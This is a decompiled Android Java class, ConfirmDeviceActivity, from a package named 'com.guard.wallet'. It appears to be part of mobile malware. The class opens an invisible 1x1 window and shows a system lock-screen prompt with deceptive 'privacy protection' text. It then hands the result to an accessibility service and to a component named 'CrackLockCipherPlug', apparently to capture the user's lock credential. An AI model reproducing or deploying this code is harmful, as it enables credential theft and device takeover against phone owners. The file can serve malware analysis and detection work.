package com.guard.wallet.activity;

import a0.C0001a;
import a1.AbstractC0026q;
import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Intent;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Build;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.support.v4.view.AbstractC0073a;
import android.support.v4.view.PointerIconCompat;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowMetrics;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.AbstractC0192o;
import com.guard.wallet.plug.C0224c;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.AbstractC0250f;
import com.guard.wallet.utils.AbstractC0252h;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import org.bouncycastle.asn1.cmp.PKIFailureInfo;
import com.guard.wallet.entity.BuildConfig;
import p004g.C0307a;
import p004g.C0308b;
import p012o.C0419h;
import p014r.EnumC0890c;

/* loaded from: classes.dex */
public class ConfirmDeviceActivity extends Activity {

    /* renamed from: e */
    public static volatile ConfirmDeviceActivity f181e;

    /* renamed from: f */
    public static final AtomicReference f182f = new AtomicReference(null);

    /* renamed from: a */
    public String f183a = BuildConfig.FLAVOR;

    /* renamed from: b */
    public String f184b = BuildConfig.FLAVOR;

    /* renamed from: c */
    public String f185c = BuildConfig.FLAVOR;

    /* renamed from: d */
    public final AtomicBoolean f186d = new AtomicBoolean(false);

    /* renamed from: a */
    public static void m334a() {
        MainApplication mainApplication = MainApplication.getInstance();
        AtomicReference atomicReference = f182f;
        if (mainApplication != null && MainApplication.getInstance().getCrackLockCipherPlug() != null) {
            C0224c crackLockCipherPlug = MainApplication.getInstance().getCrackLockCipherPlug();
            String str = (String) atomicReference.get();
            crackLockCipherPlug.getClass();
            C0224c.f264d.set(str);
            C0224c.f266f = 1L;
            C0224c.m451g();
        }
        if (AbstractC0192o.m368i() || AbstractC0192o.m367h()) {
            AbstractC0192o.m365f((String) atomicReference.get(), true);
        }
    }

    /* renamed from: b */
    public static ConfirmDeviceActivity m335b() {
        ConfirmDeviceActivity confirmDeviceActivity;
        synchronized (ConfirmDeviceActivity.class) {
            confirmDeviceActivity = f181e;
        }
        return confirmDeviceActivity;
    }

    @Override // android.app.Activity
    public final void finish() {
        if (MyAccessibilityService.m554P() != null) {
            MyAccessibilityService m554P = MyAccessibilityService.m554P();
            ConcurrentLinkedQueue concurrentLinkedQueue = m554P.f303a;
            try {
                if (!concurrentLinkedQueue.isEmpty()) {
                    concurrentLinkedQueue.removeIf(new C0001a(m554P, 9));
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
            }
            MyAccessibilityService.m554P().f309g.m1104X(EnumC0890c.ASSIST_MODE);
        }
        super.finish();
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i2, int i3, Intent intent) {
        if (i2 == 1001) {
            if (i3 == -1) {
                m334a();
            }
            finish();
        }
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        WindowMetrics currentWindowMetrics;
        Rect bounds;
        super.onCreate(bundle);
        Bundle extras = getIntent().getExtras();
        if (extras != null) {
            this.f183a = extras.getString("CONFIRM_DEVICE_CREDENTIAL_TITLE");
            this.f184b = extras.getString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE");
            this.f185c = extras.getString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION");
            f182f.set(extras.getString("CONFIRM_FOR_EVENT_CODE"));
        } else {
            this.f183a = "Verify personal identity";
            this.f184b = "Privacy protection";
            this.f185c = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";
            f182f.set("PREPARE_FOR_APP_CONFIRM_LOCK");
        }
        View view = new View(this);
        if (Build.VERSION.SDK_INT >= 30) {
            currentWindowMetrics = getWindow().getWindowManager().getCurrentWindowMetrics();
            bounds = currentWindowMetrics.getBounds();
            view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom);
        }
        setContentView(view);
        WindowManager.LayoutParams attributes = getWindow().getAttributes();
        attributes.dimAmount = 0.0f;
        attributes.x = 0;
        attributes.y = 0;
        attributes.width = 1;
        attributes.height = 1;
        attributes.gravity = 8388661;
        getWindow().setAttributes(attributes);
        getWindow().getDecorView().setBackgroundColor(0);
        getWindow().setFlags(1024, 1024);
        getWindow().addFlags(32);
        getWindow().addFlags(16);
        getWindow().addFlags(67108864);
        getWindow().addFlags(134217728);
        getWindow().addFlags(262144);
        f181e = this;
        AbstractC0252h.m688I();
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onDestroy:" + Thread.currentThread().getId());
        super.onDestroy();
        if (f181e != null) {
            synchronized (ConfirmDeviceActivity.class) {
                f181e = null;
            }
        }
    }

    @Override // android.app.Activity
    public final void onResume() {
        BiometricPrompt.Builder allowedAuthenticators;
        super.onResume();
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onResume:" + Thread.currentThread().getId());
        AtomicBoolean atomicBoolean = this.f186d;
        if (atomicBoolean.get() || atomicBoolean.get()) {
            return;
        }
        try {
            if (MyAccessibilityService.m554P() != null) {
                if (!MyAccessibilityService.m554P().m525f()) {
                    MyAccessibilityService m554P = MyAccessibilityService.m554P();
                    m554P.getClass();
                    try {
                        boolean m525f = m554P.m525f();
                        ConcurrentLinkedQueue concurrentLinkedQueue = m554P.f303a;
                        if (m525f) {
                            try {
                                if (!concurrentLinkedQueue.isEmpty()) {
                                    concurrentLinkedQueue.removeIf(new C0001a(m554P, 9));
                                }
                            } catch (Exception e2) {
                                AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e2);
                            }
                        }
                        concurrentLinkedQueue.add(new C0419h());
                        m554P.m539t(C0419h.class.getName(), C0419h.m1110M());
                    } catch (Exception e3) {
                        AbstractC0026q.m186s("com.guard.wallet.service.AccessibilityDelegateManager", e3);
                    }
                }
                int i2 = Build.VERSION.SDK_INT;
                EnumC0890c enumC0890c = EnumC0890c.VERIFY_PAUSE;
                if (i2 >= 30) {
                    AbstractC0073a.m280o();
                    allowedAuthenticators = AbstractC0073a.m269d(this).setTitle(this.f183a).setSubtitle(this.f184b).setDescription(this.f185c).setAllowedAuthenticators(32768);
                    BiometricPrompt build = allowedAuthenticators.build();
                    CancellationSignal cancellationSignal = new CancellationSignal();
                    cancellationSignal.setOnCancelListener(new C0308b());
                    atomicBoolean.set(true);
                    MyAccessibilityService.m554P().f309g.m1104X(enumC0890c);
                    build.authenticate(cancellationSignal, getMainExecutor(), new C0307a());
                    return;
                }
                KeyguardManager keyguardManager = (KeyguardManager) getSystemService("keyguard");
                if (keyguardManager != null) {
                    Intent createConfirmDeviceCredentialIntent = keyguardManager.createConfirmDeviceCredentialIntent(AbstractC0250f.m627b(this.f183a), this.f185c);
                    createConfirmDeviceCredentialIntent.addFlags(PKIFailureInfo.duplicateCertReq);
                    createConfirmDeviceCredentialIntent.addFlags(67108864);
                    createConfirmDeviceCredentialIntent.addFlags(8388608);
                    atomicBoolean.set(true);
                    MyAccessibilityService.m554P().f309g.m1104X(enumC0890c);
                    startActivityForResult(createConfirmDeviceCredentialIntent, PointerIconCompat.TYPE_CONTEXT_MENU);
                }
            }
        } catch (Exception e4) {
            AbstractC0026q.m186s("ConfirmDeviceActivity", e4);
        }
    }

    @Override // android.app.Activity
    public final void onStart() {
        super.onStart();
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onStart:" + Thread.currentThread().getId());
    }

    @Override // android.app.Activity
    public final void onStop() {
        Log.d("ConfirmDeviceActivity", "ConfirmDeviceActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
